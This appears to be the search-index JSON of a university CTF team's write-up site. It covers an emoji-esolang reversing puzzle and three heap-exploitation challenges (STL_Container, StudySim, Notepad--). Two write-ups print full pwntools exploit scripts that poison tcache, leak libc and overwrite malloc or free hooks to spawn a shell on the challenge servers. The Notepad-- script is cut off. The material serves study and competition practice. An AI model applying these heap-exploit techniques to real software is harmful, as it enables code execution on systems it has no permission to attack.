{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Welcome to TeamShakti Writeups Introduction This repo is hosted by TeamShakti , the women-only CTF team of Amrita Vishwa Vidyapeetham, Amritapuri Campus . The contents of this repo This repo contains the writeups of varoius challenges from CTFs we have attempted. Reverse Engineering Binary Exploitation Cryptography Web Exploitation Forensic Analysis Miscellaneous","title":"Welcome to TeamShakti Writeups"},{"location":"#welcome-to-teamshakti-writeups","text":"","title":"Welcome to TeamShakti Writeups"},{"location":"#introduction","text":"This repo is hosted by TeamShakti , the women-only CTF team of Amrita Vishwa Vidyapeetham, Amritapuri Campus .","title":"Introduction"},{"location":"#the-contents-of-this-repo","text":"This repo contains the writeups of varoius challenges from CTFs we have attempted. Reverse Engineering Binary Exploitation Cryptography Web Exploitation Forensic Analysis Miscellaneous","title":"The contents of this repo"},{"location":"about/","text":"About Us","title":"About Us"},{"location":"about/#about-us","text":"","title":"About Us"},{"location":"crypto/intro/","text":"Cryptography Introduction \"Write about Crypto and about the writeups\" The contents of this repo This repo contains the writeups of varoius challenges from CTFs we have attempted.","title":"Cryptography"},{"location":"crypto/intro/#cryptography","text":"","title":"Cryptography"},{"location":"crypto/intro/#introduction","text":"\"Write about Crypto and about the writeups\"","title":"Introduction"},{"location":"crypto/intro/#the-contents-of-this-repo","text":"This repo contains the writeups of varoius challenges from CTFs we have attempted.","title":"The contents of this repo"},{"location":"forensics/intro/","text":"Forensics Introduction \"Write about Forensics and about the writeups\" The contents of this repo This repo contains the writeups of varoius challenges from CTFs we have attempted.","title":"Forensics"},{"location":"forensics/intro/#forensics","text":"","title":"Forensics"},{"location":"forensics/intro/#introduction","text":"\"Write about Forensics and about the writeups\"","title":"Introduction"},{"location":"forensics/intro/#the-contents-of-this-repo","text":"This repo contains the writeups of varoius challenges from CTFs we have attempted.","title":"The contents of this repo"},{"location":"misc/intro/","text":"Miscellaneous Introduction The following are the Links to the writeups to the challenges we have solved from CTF's from the Misc category. The contents of this repo This repo contains the writeups of various challenges from CTFs we have attempted. HSCTF7 2020 Emojis","title":"Miscellaneous"},{"location":"misc/intro/#miscellaneous","text":"","title":"Miscellaneous"},{"location":"misc/intro/#introduction","text":"The following are the Links to the writeups to the challenges we have solved from CTF's from the Misc category.","title":"Introduction"},{"location":"misc/intro/#the-contents-of-this-repo","text":"This repo contains the writeups of various challenges from CTFs we have attempted. HSCTF7 2020 Emojis","title":"The contents of this repo"},{"location":"misc/HSCTF7/Emojis/","text":"Emojis - Misc HSCTF2020 Description This challenge was made using emojigram language which is an esolang made using Emojis. All that we need to do is repicate the code in python and generate the flag from it by reversing the code. Replicated Code The replicated code looked like this. But since there are conditional jumps and all that we are given is the output when the flag is given, we have no choice but to guess whether the jumps are taken or not inorder to obttain the desired input. And to achieve the same we played around with a few of the instructions and put together the possibilities to get the Flag. flag=[120, 66, 94, 114, 95, 69, 110, 125, 73, 78, 99, 52, 118] flag[9]=flag[9]+flag[1] flag[7]=flag[7]+flag[11] flag[2]=47 flag[4]=flag[4]+flag[11] flag[0]=flag[0]+flag[2] flag[8]=flag[8]-8 flag[6]=flag[6]+flag[8] flag[6]=flag[6]-flag[8] flag[6]=flag[6]-flag[8] flag[10]=flag[10]+8 flag[11]=flag[11]-1 flag[4]=flag[4]-flag[9] flag[3]=flag[3]-2 flag[2]=flag[2]-4 flag[0]=flag[0]-flag[11] flag[1]=flag[1]-flag[3] flag[1]=flag[1]+flag[3] flag[1]=flag[1]+flag[3] flag[1]=flag[1]-flag[7] flag[3]=flag[12] flag[2]=flag[2]+8 flag[9]=flag[9]-flag[6] flag[2]=flag[2]+flag[4] #flag[1]==flag[5] #False flag[2]=flag[5] #flag[1]==flag[12] #False #flag[11]=flag[11]+flag[0] flag[12]=118 Solution Flag: flag{tr3v0r-pAck3p}","title":"Emojis - Misc HSCTF2020"},{"location":"misc/HSCTF7/Emojis/#emojis-misc-hsctf2020","text":"","title":"Emojis - Misc HSCTF2020"},{"location":"misc/HSCTF7/Emojis/#description","text":"This challenge was made using emojigram language which is an esolang made using Emojis. All that we need to do is repicate the code in python and generate the flag from it by reversing the code.","title":"Description"},{"location":"misc/HSCTF7/Emojis/#replicated-code","text":"The replicated code looked like this. But since there are conditional jumps and all that we are given is the output when the flag is given, we have no choice but to guess whether the jumps are taken or not inorder to obttain the desired input. And to achieve the same we played around with a few of the instructions and put together the possibilities to get the Flag. flag=[120, 66, 94, 114, 95, 69, 110, 125, 73, 78, 99, 52, 118] flag[9]=flag[9]+flag[1] flag[7]=flag[7]+flag[11] flag[2]=47 flag[4]=flag[4]+flag[11] flag[0]=flag[0]+flag[2] flag[8]=flag[8]-8 flag[6]=flag[6]+flag[8] flag[6]=flag[6]-flag[8] flag[6]=flag[6]-flag[8] flag[10]=flag[10]+8 flag[11]=flag[11]-1 flag[4]=flag[4]-flag[9] flag[3]=flag[3]-2 flag[2]=flag[2]-4 flag[0]=flag[0]-flag[11] flag[1]=flag[1]-flag[3] flag[1]=flag[1]+flag[3] flag[1]=flag[1]+flag[3] flag[1]=flag[1]-flag[7] flag[3]=flag[12] flag[2]=flag[2]+8 flag[9]=flag[9]-flag[6] flag[2]=flag[2]+flag[4] #flag[1]==flag[5] #False flag[2]=flag[5] #flag[1]==flag[12] #False #flag[11]=flag[11]+flag[0] flag[12]=118","title":"Replicated Code"},{"location":"misc/HSCTF7/Emojis/#solution","text":"Flag: flag{tr3v0r-pAck3p}","title":"Solution"},{"location":"pwning/intro/","text":"Binary Exploitation Introduction \"Write about Pwn and about the writeups\" The contents of this repo This repo contains the writeups of varoius challenges from CTFs we have attempted. De1CTF20 STL_Container - Shruti Dixit HSCTF20 StudySim - Shruti Dixit VolgaCTF20 Notepad-- - Shruti Dixit","title":"Binary Exploitation"},{"location":"pwning/intro/#binary-exploitation","text":"","title":"Binary Exploitation"},{"location":"pwning/intro/#introduction","text":"\"Write about Pwn and about the writeups\"","title":"Introduction"},{"location":"pwning/intro/#the-contents-of-this-repo","text":"This repo contains the writeups of varoius challenges from CTFs we have attempted. De1CTF20 STL_Container - Shruti Dixit HSCTF20 StudySim - Shruti Dixit VolgaCTF20 Notepad-- - Shruti Dixit","title":"The contents of this repo"},{"location":"pwning/De1CTF20/stl/","text":"STL_Container Solved by: Shruti (@rudyerudite) De1CTF had very interesting Pwn and RE challenges but I could only find time to attempt two: STL_Container and Parser of either categories respectively. Here\u2019s a short writeup on a how I solved the former during the CTF. This is a simple challenge for learning and exploiting Tcache. To get the initial click, we run a checksec.sh on the binary and find that all the mitigations are enabled except that RELRO is partial. It\u2019s a 64-bit non-stripped binary which requires libc 2.27. Let\u2019s checkout the typical menu of every heap challenge: STL Container Test 1. list 2. vector 3. queue 4. stack 5. exit 1 1. add 2. delete 3. show 1 input data:aaa done! STL Container Test 1. list 2. vector 3. queue 4. stack 5. exit So CPP program presents us with 3 in built data structures of the most reliable STL library. Stack and queue make use of deque, list makes use of doubly linked list and vector uses a vector. I started out by allocating all the different data structures and found out that one could allocate only 2 nodes in each of the data structures. The allocation of each of these is done on the heap and and makes a fixed allocation of 0x98 bytes for each node. It reads in 0x98 bytes of data. Taking all these into account, there could be a possibility of overwriting free_hook with a one_gadget ( as a shortcut to erstwhile overwriting with system). As the allocation was done using malloc one could get it easily by simply allocating, deleting and printing the contents of the chunk. And we had all the 3 functionalities under our control- though printing was not supported for stack and queue. So I started off by allocating chunks and then deleting them one by one. What I noticed was when deleting vector I got a double free! Which implies there was a chunk pointing to itself in the tcache. That\u2019s why I was able to allocate only 7 chunks. Getting the Leaks I got the heap leaks by simply allocating the chunk which had pointers to the next chunk in the list. After that I called the print functionality. Hmmm\u2026 I\u2019d a heap in the unsorted bin which I\u2019d to allocate and print the contents. But because of the double free and also weird functionality of the code (copy content of a chunk to another and then delete the previous) I was not able to do it so easily. I created a list node and was allocated on the heap. This is how a structure of a node (in list) looked like: 0x5555555455000000: heap_addr_of_next_node heap_addr_of_prev_node 0x5555555455000010: heap_addr_of_the_stored_content I simply allocated one of the freed vector chunks and overwrote the next pointer to the heap address of the stored content. Then on the next allocation the naive tcache gave me the liberty to overwrite the address 0x5555555455000010 with the address of the chunk in the unsorted bin. I did so to make use of the print functionality so that I could simply print out the contents of the list node which I had previously created. But yes the contents printed out weren\u2019t the earlier contents :). That\u2019s how I got the libc leak! Final Exploit I created 2 vectors and deleted them to get a similar double free but this time overwrote next pointer with free_hook with a one_gadget and called a free using delete. Running the code swiftly popped up the much anticipated shell! Here\u2019s the final exploit for the code, mind you it\u2019s not the most optimized code and there could be better ways of solving it. It might be a little confusing to understand, so better get your hands dirty on the binary and try out the exploit yourself! from pwn import * #r = process('./stl_container') r = remote('206.189.186.98',18848) def callds(ds,opt,value,idx): r.sendlineafter( ,str(ds)) r.sendlineafter( ,str(opt)) if(opt == 1): r.sendlineafter( input data: ,value) print(r.recvline()) else: if((ds == 3 or ds == 4) and opt == 2): return r.sendlineafter( index?\\n ,str(idx)) if(ds ==2): print( lol ) print(r.recvline()) #payload = p64(0x0)+p64(0x91)+'a'*(0xa0-0x20)+p64(0x90) #adding chunks to tcache callds(1,1,'a'*0x10,-1) callds(1,1,'b'*0x10,-1) callds(2,1,'c'*0x10,-1) callds(2,1,'d'*0x10,-1) callds(3,1,'e'*0x10,-1) callds(3,1,'f'*0x10,-1) callds(4,1,'g'*0x10,-1) payload = p64(0xa1)*0x6 + p64(0x0) callds(4,1,payload,-1) #deleting chunks; unsorted bin callds(1,2,-1,0) callds(1,2,-1,1) callds(2,2,-1,0) callds(2,2,-1,0) callds(3,2,-1,0) callds(3,2,-1,1) callds(4,2,-1,0) callds(4,2,-1,1) #getting heap leaks callds(1,1,'',-1) callds(1,3,'',1) print(r.recvline()) leak = u64(( \\x70 +r.recvline().strip()).ljust(8,'\\x00')) print(hex(leak)) #getting libc leaks chunk = p64(leak -0x3f0) callds(3,1,'',-1) callds(3,1,chunk,-1) callds(4,1,'/bin/sh',-1) payload = p64(leak+0xa0) callds(4,1,payload,-1) callds(1,3,'',0) leak = u64(r.recvline().strip().split( : )[1].ljust(8,'\\x00')) print(hex(leak)) libc_base = leak - 0x3ebca0 system = libc_base + 0x4f440 malloc_hook = libc_base + 0x3ebc30 free_hook = libc_base + 0x3ed8e8 one_gadget = libc_base + 0x4f322 #final overwrite callds(1,2,-1,0) callds(1,2,-1,0) callds(3,2,-1,0) #to cause a loop callds(2,1,'c'*0x10,-1) callds(2,1,'d'*0x10,-1) callds(2,2,-1,0) callds(2,2,-1,0) payload = p64(free_hook) callds(2,1,payload,-1) callds(3,1,p64(one_gadget),-1) #gdb.attach(r) r.interactive() ##De1CTF{NeuEr_u51ng_O6j3ct_1n_VecT0r}","title":"STL_Container"},{"location":"pwning/De1CTF20/stl/#stl_container","text":"Solved by: Shruti (@rudyerudite) De1CTF had very interesting Pwn and RE challenges but I could only find time to attempt two: STL_Container and Parser of either categories respectively. Here\u2019s a short writeup on a how I solved the former during the CTF. This is a simple challenge for learning and exploiting Tcache. To get the initial click, we run a checksec.sh on the binary and find that all the mitigations are enabled except that RELRO is partial. It\u2019s a 64-bit non-stripped binary which requires libc 2.27. Let\u2019s checkout the typical menu of every heap challenge: STL Container Test 1. list 2. vector 3. queue 4. stack 5. exit 1 1. add 2. delete 3. show 1 input data:aaa done! STL Container Test 1. list 2. vector 3. queue 4. stack 5. exit So CPP program presents us with 3 in built data structures of the most reliable STL library. Stack and queue make use of deque, list makes use of doubly linked list and vector uses a vector. I started out by allocating all the different data structures and found out that one could allocate only 2 nodes in each of the data structures. The allocation of each of these is done on the heap and and makes a fixed allocation of 0x98 bytes for each node. It reads in 0x98 bytes of data. Taking all these into account, there could be a possibility of overwriting free_hook with a one_gadget ( as a shortcut to erstwhile overwriting with system). As the allocation was done using malloc one could get it easily by simply allocating, deleting and printing the contents of the chunk. And we had all the 3 functionalities under our control- though printing was not supported for stack and queue. So I started off by allocating chunks and then deleting them one by one. What I noticed was when deleting vector I got a double free! Which implies there was a chunk pointing to itself in the tcache. That\u2019s why I was able to allocate only 7 chunks.","title":"STL_Container"},{"location":"pwning/De1CTF20/stl/#getting-the-leaks","text":"I got the heap leaks by simply allocating the chunk which had pointers to the next chunk in the list. After that I called the print functionality. Hmmm\u2026 I\u2019d a heap in the unsorted bin which I\u2019d to allocate and print the contents. But because of the double free and also weird functionality of the code (copy content of a chunk to another and then delete the previous) I was not able to do it so easily. I created a list node and was allocated on the heap. This is how a structure of a node (in list) looked like: 0x5555555455000000: heap_addr_of_next_node heap_addr_of_prev_node 0x5555555455000010: heap_addr_of_the_stored_content I simply allocated one of the freed vector chunks and overwrote the next pointer to the heap address of the stored content. Then on the next allocation the naive tcache gave me the liberty to overwrite the address 0x5555555455000010 with the address of the chunk in the unsorted bin. I did so to make use of the print functionality so that I could simply print out the contents of the list node which I had previously created. But yes the contents printed out weren\u2019t the earlier contents :). That\u2019s how I got the libc leak!","title":"Getting the Leaks"},{"location":"pwning/De1CTF20/stl/#final-exploit","text":"I created 2 vectors and deleted them to get a similar double free but this time overwrote next pointer with free_hook with a one_gadget and called a free using delete. Running the code swiftly popped up the much anticipated shell! Here\u2019s the final exploit for the code, mind you it\u2019s not the most optimized code and there could be better ways of solving it. It might be a little confusing to understand, so better get your hands dirty on the binary and try out the exploit yourself! from pwn import * #r = process('./stl_container') r = remote('206.189.186.98',18848) def callds(ds,opt,value,idx): r.sendlineafter( ,str(ds)) r.sendlineafter( ,str(opt)) if(opt == 1): r.sendlineafter( input data: ,value) print(r.recvline()) else: if((ds == 3 or ds == 4) and opt == 2): return r.sendlineafter( index?\\n ,str(idx)) if(ds ==2): print( lol ) print(r.recvline()) #payload = p64(0x0)+p64(0x91)+'a'*(0xa0-0x20)+p64(0x90) #adding chunks to tcache callds(1,1,'a'*0x10,-1) callds(1,1,'b'*0x10,-1) callds(2,1,'c'*0x10,-1) callds(2,1,'d'*0x10,-1) callds(3,1,'e'*0x10,-1) callds(3,1,'f'*0x10,-1) callds(4,1,'g'*0x10,-1) payload = p64(0xa1)*0x6 + p64(0x0) callds(4,1,payload,-1) #deleting chunks; unsorted bin callds(1,2,-1,0) callds(1,2,-1,1) callds(2,2,-1,0) callds(2,2,-1,0) callds(3,2,-1,0) callds(3,2,-1,1) callds(4,2,-1,0) callds(4,2,-1,1) #getting heap leaks callds(1,1,'',-1) callds(1,3,'',1) print(r.recvline()) leak = u64(( \\x70 +r.recvline().strip()).ljust(8,'\\x00')) print(hex(leak)) #getting libc leaks chunk = p64(leak -0x3f0) callds(3,1,'',-1) callds(3,1,chunk,-1) callds(4,1,'/bin/sh',-1) payload = p64(leak+0xa0) callds(4,1,payload,-1) callds(1,3,'',0) leak = u64(r.recvline().strip().split( : )[1].ljust(8,'\\x00')) print(hex(leak)) libc_base = leak - 0x3ebca0 system = libc_base + 0x4f440 malloc_hook = libc_base + 0x3ebc30 free_hook = libc_base + 0x3ed8e8 one_gadget = libc_base + 0x4f322 #final overwrite callds(1,2,-1,0) callds(1,2,-1,0) callds(3,2,-1,0) #to cause a loop callds(2,1,'c'*0x10,-1) callds(2,1,'d'*0x10,-1) callds(2,2,-1,0) callds(2,2,-1,0) payload = p64(free_hook) callds(2,1,payload,-1) callds(3,1,p64(one_gadget),-1) #gdb.attach(r) r.interactive() ##De1CTF{NeuEr_u51ng_O6j3ct_1n_VecT0r}","title":"Final Exploit"},{"location":"pwning/HSCTF20/studysim/","text":"Studysim This was a fun challenge on the vulnerable Tcache bins but different one compared to the simple FD overwrites one would expect. So let\u2019s check it out! Along, with the challenge binary we were provided with Glibc 2.29 and loader for it. You can possibly use patchelf tool if your local environment is not of the one required for the challenge, so that your binary loads the Glibc 2.29 libc and the required loader for it. Carrying out the initial checksec step, we get the following information on the mitigations: Canary : Yes NX : Yes PIE : No Fortify : No RelRO : Full So possibly some overwrite on any of the hooks? A possible FSOP? Let\u2019s explore! The menu function which we are presented with: Welcome to study simulator! Because who has free time when you must STUDY. Commands: add - Adds a worksheet onto your stack of worksheets do - Complete the top worksheets sleep - Give up and sleep Add Let\u2019s us create a new chunk of any size below 0x400 and then the allocated chunk\u2019s address is then stored in an array called stack in .bss section. If the count of the chunks is already 7 then we cannot store anymore chunks but otherwise it simply increments the count variable. stack[allocated_count ++] = address of the allocated chunk After this we can give some content and it prints back the content which we have just added. Do Here comes the vulnerable part. The function asks the user to input any number of integer and reduces the value of allocated_count by that much value without any checks on the input value. Which means using this we can store our return allocated address anywhere on the .bss. This is how the .bss section looks like: 0x404020 stdout@@GLIBC_2.2.5 : 0x00007ffff7fc6760 0x0000000000000000 0x404030 stdin@@GLIBC_2.2.5 : 0x00007ffff7fc5a00 0x0000000000000000 0x404040 allocated_count : 0x0000000000000000 0x0000000000000000 0x404050: 0x0000000000000000 0x0000000000000000 0x404060 stack : 0x0000000000000000 0x0000000000000000 0x404070 stack+16 : 0x0000000000000000 0x0000000000000000 0x404080 stack+32 : 0x0000000000000000 0x0000000000000000 0x404090 stack+48 : 0x0000000000000000 0x0000000000000000 Sleep Well, it just sleeps and exits. Nothing interesting here. Getting the Leaks To get the heap leaks, we can invoke the Do() functionality and then reduce the allocated_count to a negative value such that the address of the heap chunk returned by the malloc function is stored on the allocated_count .bss address. As the binary prints out the value of allocated_count here we get the heap leaks. You throw the worksheet '0@@' on your stack of worksheets. For the libc leaks, well it won\u2019t be that easy as there\u2019s a size check and also no free() to invoke anywhere anyhow. As the libc addresses are stored on the .bss section we need to somehow get an allocation there (as the binary prints the content of the chunk). So now how do we control this? Here, comes the Tcache structure. I found this really good reference for understanding about how the Tcache keeps a track of the number of chunks in Tcache and their addresses. I won\u2019t be explaining it in detail; you can check out the resource mentioned and try checking out the structure in GDB by allocating and freeing chunks in Tcache for any program which allows you to do it. By calculating the right offset with the heap leaks and the known .bss address of the array stack one can get the allocation in the Tcache structure ( using the Do() functionality again ofc). First, we can overwrite the first 8 bytes of tcache_perthread_struct.count. And then similarly on the next allocation we can overwrite the first pointer stored in tcache_perthread_struct.entries (such that it acts as a freed chunk of size of 0x20 bytes). This pointer must have the .bss address of stdout_GLIBC stored as it\u2019s forward pointer. So on the next call on malloc you can get an allocation there and cleverly leak out the libc address stored! 0x1553000: 0x0000000000000000 0x0000000000000251 -- Tcache struct begins 0x1553010: 0x000000000155327f 0x0000000000000000 -- First 8 bytes overwritten with count 0x1553020: 0x0000000000000000 0x0000000000000000 0x1553030: 0x0000000000000000 0x0000000000000000 0x1553040: 0x0000000000000000 0x0000000000000000 0x1553050: 0x0000000000404030 0x0000000000000000 -- Next chunk in line for allocation 0x1553060: 0x0000000000000000 0x0000000000000000 Final Exploit By using the same trick as for the libc leaks, we can trigger the final exploit. Like last time by cleverly getting an allocation on Tcache (probably a chunk of another size, as it might give SIGSEV) of a chunk with FD pointer set to malloc_hook . On the next call to malloc() function we would get an allocation on malloc_hook (exploiting the naive tcache). Now you can simply overwrite it with a one_gadget and on next malloc KABOOM!!! from pwn import * bss_stack = 0x404060 #k = process( ./studysim ,env = { LD_PRELOAD : ./libc.so.6 }) k = remote('pwn.hsctf.com', 5007) def add(size,content): k.sendlineafter( , add ) k.sendlineafter( worksheet?\\n ,str(size)) k.sendlineafter( worksheet?\\n ,content) def do(count): k.sendlineafter( , do ) k.sendlineafter( finish?\\n ,str(count)) def sleep(): k.sendlineafter( , sleep ) stdout_bss = 0x0000000000404030 #heap leaks do(4) add(0x10,'a'*0x10) do(0) k.recvuntil( Only ) heap_leak = int(k.recvline().strip().split( )[0],10)-1 print(hex(heap_leak)) do(heap_leak) #get a count chunk = heap_leak-0x250-0x8 diff = -bss_stack+chunk do(-diff/8) add(0x10,'c'*0x10) do(diff/8+1) #allocate a chunk at .bss addr of stdin chunk = heap_leak-0x208-0x10 diff = -bss_stack+chunk do(-diff/8) add(0x10,p64(stdout_bss)) do(diff/8+1) add(0x08,'') k.sendlineafter( , add ) k.sendlineafter( worksheet?\\n ,str(0x8)) k.sendlineafter( worksheet?\\n ,'a') k.recvuntil( worksheet ) leak = k.recvline().strip().split( )[0].replace( ' , ) leak = '\\x00'+leak[1:] leak = u64(leak.ljust(8,'\\x00')) libc_base = leak-0x1e4a00 print(hex(libc_base)) do(3) #allocate chunk at __malloc_hook malloc_hook = libc_base + 0x0000000001e4c30 system = libc_base + 0x0000000000052fd0 one_gadget = libc_base + 0xe2383 chunk = heap_leak-0x208-0x8 diff = -bss_stack+chunk do(-diff/8) add(0x20,p64(malloc_hook)) do(diff/8+1) add(0x08,'') k.sendlineafter( , add ) k.sendlineafter( worksheet?\\n ,str(0x8)) k.sendlineafter( worksheet?\\n ,p64(one_gadget)) do(2) #call system k.sendlineafter( , add ) k.sendlineafter( worksheet?\\n ,'0') k.interactive()","title":"Studysim"},{"location":"pwning/HSCTF20/studysim/#studysim","text":"This was a fun challenge on the vulnerable Tcache bins but different one compared to the simple FD overwrites one would expect. So let\u2019s check it out! Along, with the challenge binary we were provided with Glibc 2.29 and loader for it. You can possibly use patchelf tool if your local environment is not of the one required for the challenge, so that your binary loads the Glibc 2.29 libc and the required loader for it. Carrying out the initial checksec step, we get the following information on the mitigations: Canary : Yes NX : Yes PIE : No Fortify : No RelRO : Full So possibly some overwrite on any of the hooks? A possible FSOP? Let\u2019s explore! The menu function which we are presented with: Welcome to study simulator! Because who has free time when you must STUDY. Commands: add - Adds a worksheet onto your stack of worksheets do - Complete the top worksheets sleep - Give up and sleep","title":"Studysim"},{"location":"pwning/HSCTF20/studysim/#add","text":"Let\u2019s us create a new chunk of any size below 0x400 and then the allocated chunk\u2019s address is then stored in an array called stack in .bss section. If the count of the chunks is already 7 then we cannot store anymore chunks but otherwise it simply increments the count variable. stack[allocated_count ++] = address of the allocated chunk After this we can give some content and it prints back the content which we have just added.","title":"Add"},{"location":"pwning/HSCTF20/studysim/#do","text":"Here comes the vulnerable part. The function asks the user to input any number of integer and reduces the value of allocated_count by that much value without any checks on the input value. Which means using this we can store our return allocated address anywhere on the .bss. This is how the .bss section looks like: 0x404020 stdout@@GLIBC_2.2.5 : 0x00007ffff7fc6760 0x0000000000000000 0x404030 stdin@@GLIBC_2.2.5 : 0x00007ffff7fc5a00 0x0000000000000000 0x404040 allocated_count : 0x0000000000000000 0x0000000000000000 0x404050: 0x0000000000000000 0x0000000000000000 0x404060 stack : 0x0000000000000000 0x0000000000000000 0x404070 stack+16 : 0x0000000000000000 0x0000000000000000 0x404080 stack+32 : 0x0000000000000000 0x0000000000000000 0x404090 stack+48 : 0x0000000000000000 0x0000000000000000","title":"Do"},{"location":"pwning/HSCTF20/studysim/#sleep","text":"Well, it just sleeps and exits. Nothing interesting here.","title":"Sleep"},{"location":"pwning/HSCTF20/studysim/#getting-the-leaks","text":"To get the heap leaks, we can invoke the Do() functionality and then reduce the allocated_count to a negative value such that the address of the heap chunk returned by the malloc function is stored on the allocated_count .bss address. As the binary prints out the value of allocated_count here we get the heap leaks. You throw the worksheet '0@@' on your stack of worksheets. For the libc leaks, well it won\u2019t be that easy as there\u2019s a size check and also no free() to invoke anywhere anyhow. As the libc addresses are stored on the .bss section we need to somehow get an allocation there (as the binary prints the content of the chunk). So now how do we control this? Here, comes the Tcache structure. I found this really good reference for understanding about how the Tcache keeps a track of the number of chunks in Tcache and their addresses. I won\u2019t be explaining it in detail; you can check out the resource mentioned and try checking out the structure in GDB by allocating and freeing chunks in Tcache for any program which allows you to do it. By calculating the right offset with the heap leaks and the known .bss address of the array stack one can get the allocation in the Tcache structure ( using the Do() functionality again ofc). First, we can overwrite the first 8 bytes of tcache_perthread_struct.count. And then similarly on the next allocation we can overwrite the first pointer stored in tcache_perthread_struct.entries (such that it acts as a freed chunk of size of 0x20 bytes). This pointer must have the .bss address of stdout_GLIBC stored as it\u2019s forward pointer. So on the next call on malloc you can get an allocation there and cleverly leak out the libc address stored! 0x1553000: 0x0000000000000000 0x0000000000000251 -- Tcache struct begins 0x1553010: 0x000000000155327f 0x0000000000000000 -- First 8 bytes overwritten with count 0x1553020: 0x0000000000000000 0x0000000000000000 0x1553030: 0x0000000000000000 0x0000000000000000 0x1553040: 0x0000000000000000 0x0000000000000000 0x1553050: 0x0000000000404030 0x0000000000000000 -- Next chunk in line for allocation 0x1553060: 0x0000000000000000 0x0000000000000000","title":"Getting the Leaks"},{"location":"pwning/HSCTF20/studysim/#final-exploit","text":"By using the same trick as for the libc leaks, we can trigger the final exploit. Like last time by cleverly getting an allocation on Tcache (probably a chunk of another size, as it might give SIGSEV) of a chunk with FD pointer set to malloc_hook . On the next call to malloc() function we would get an allocation on malloc_hook (exploiting the naive tcache). Now you can simply overwrite it with a one_gadget and on next malloc KABOOM!!! from pwn import * bss_stack = 0x404060 #k = process( ./studysim ,env = { LD_PRELOAD : ./libc.so.6 }) k = remote('pwn.hsctf.com', 5007) def add(size,content): k.sendlineafter( , add ) k.sendlineafter( worksheet?\\n ,str(size)) k.sendlineafter( worksheet?\\n ,content) def do(count): k.sendlineafter( , do ) k.sendlineafter( finish?\\n ,str(count)) def sleep(): k.sendlineafter( , sleep ) stdout_bss = 0x0000000000404030 #heap leaks do(4) add(0x10,'a'*0x10) do(0) k.recvuntil( Only ) heap_leak = int(k.recvline().strip().split( )[0],10)-1 print(hex(heap_leak)) do(heap_leak) #get a count chunk = heap_leak-0x250-0x8 diff = -bss_stack+chunk do(-diff/8) add(0x10,'c'*0x10) do(diff/8+1) #allocate a chunk at .bss addr of stdin chunk = heap_leak-0x208-0x10 diff = -bss_stack+chunk do(-diff/8) add(0x10,p64(stdout_bss)) do(diff/8+1) add(0x08,'') k.sendlineafter( , add ) k.sendlineafter( worksheet?\\n ,str(0x8)) k.sendlineafter( worksheet?\\n ,'a') k.recvuntil( worksheet ) leak = k.recvline().strip().split( )[0].replace( ' , ) leak = '\\x00'+leak[1:] leak = u64(leak.ljust(8,'\\x00')) libc_base = leak-0x1e4a00 print(hex(libc_base)) do(3) #allocate chunk at __malloc_hook malloc_hook = libc_base + 0x0000000001e4c30 system = libc_base + 0x0000000000052fd0 one_gadget = libc_base + 0xe2383 chunk = heap_leak-0x208-0x8 diff = -bss_stack+chunk do(-diff/8) add(0x20,p64(malloc_hook)) do(diff/8+1) add(0x08,'') k.sendlineafter( , add ) k.sendlineafter( worksheet?\\n ,str(0x8)) k.sendlineafter( worksheet?\\n ,p64(one_gadget)) do(2) #call system k.sendlineafter( , add ) k.sendlineafter( worksheet?\\n ,'0') k.interactive()","title":"Final Exploit"},{"location":"pwning/VolgaCTF20/notepad/","text":"Notepad-- This 300 pointer challenge was the solo Pwn challenge in VolgaCTF and I solved it just after the CTF ended :(. The following exploit is tested on a Ubuntu 18.04 VM. Here\u2019s the description of the challenge: Notepad\u2013 is the app to store your most private notes, with an extremely lightweight UI. Check it out! We are just given the challenge binary for this challenge. Also, the 64-bit dynamically linked stripped binary had all the protections enabled other than FORTIFY. Reversing The Notepad application presents us a menu function which looks like: Welcome to Notepad-- Pick an existing notebook or create a new one [p]ick notebook [a]dd notebook [d]elete notebook [l]ist notebook [q]uit The structure of the notebook and tab is as follows, struct notebook { char name[16]; int number_of_tabs; struct tab tabs[64]; } struct tabs { char name[16]; int size; char* content; } So the functionality allows you to pick a notebook by giving the index as index_of_notebook + 1 and to try out the functionalities of tabs. Operations with notebook aaaaaaa [a]dd tab [v]iew tab [u]pdate tab [d]elete tab [l]ist tabs [q]uit This let\u2019s you add a tab, view the data in each tab ( (len(data_it_prints) is equal to tab- size) , list all the names of tabs in a notebook, delete a tab and go back to the previous menu. So hoping that the functionalities of the binary is clear let\u2019s move on! Vulnerability and the exploit Getting the leaks As the libc is not given and as PIE and RELRO are fully enabled the best way to get the leaks here is to allocate an unsorted bin chunk, free it and view it. As the binary uses malloc() the libc pointers are retained after allocation provided we give an empty content. Here\u2019s what I did: Allocated a chunk of size 0x500 bytes so that after freeing it goes to the unsorted bin Deleted the chunk using delete_tab functionality Allocated another chunk of size 0x20. Malloc would split the previous chunk and allocate me a chunk of 0x30 size (0x10 for the header). The allocated chunk had the first 2 0x8 bytes set to a libc pointer Did a view and got the leaks by calculating the offsets Mind you, I did this locally and not on the server. To get which libc the binary is using you might have to look up the last 3 nibbles in the libc database to get the libc version the challenge is using! Overwriting the free_hook The first obvious bug in the binary is the manner in how it takes in the name of the notebook and the tab. It takes the input through scanf( \u201c%s\u201d, name) which makes it obvious that it is prone to the classic buffer overflow! Here\u2019s the code snippet of the add_notebook functionality: int add_notebook() { __int64 v1; // rax char *v2; // ST08_8 if ( nb_ctr == 16 ) return puts( You've reached the limit for notebooks! Delete some of the older once first! ); v1 = nb_ctr++; v2 = (char *) table + 2072 * v1; printf( Enter notebook name: ); return __isoc99_scanf( %s , v2); } Now, that you have got the leaks you can find the address of free_hook which is a libc pointer that is invoked when the program calls free(chunk). To carry out the final exploit our aim is now to overwrite the free_hook. To do this we do have to explore another vulnerability which lies in the update_tab functionality. Update_tab function let\u2019s you update any tab of the index lesser than notebook- number_of_tabs. Enter index of tab to update: 1 Enter new tab name (leave empty to skip): Enter new data length (leave empty to keep the same): Enter the data: And as you can see in above if the new length is same as the previous it just simply lets you update the content pointed by the data pointer. Otherwise, it frees the current data pointer and calls a malloc() with a size. What if I could overwrite tabs- data pointer with free_hook and call an update functionality without giving a different size? Let\u2019s see what we can do! Add another note (as first one was used for the leaks) and using scanf(\u201c%s\u201d,name) overflow junk in place of name but overwrite size with a valid size and data pointer with free_hook. Pick that note and update tab with index 1. As discussed above, leave data length empty, point free_hook to system(). Free a chunk holding the string \u201c/bin/sh\\x00\u201d and BOOM!!! Exploit Code from pwn import * r = process('./notepad') # notebook functionalities def add_note(name): r.sendlineafter(' ','a') r.sendlineafter('name: ',name) def pick_note(): #display items 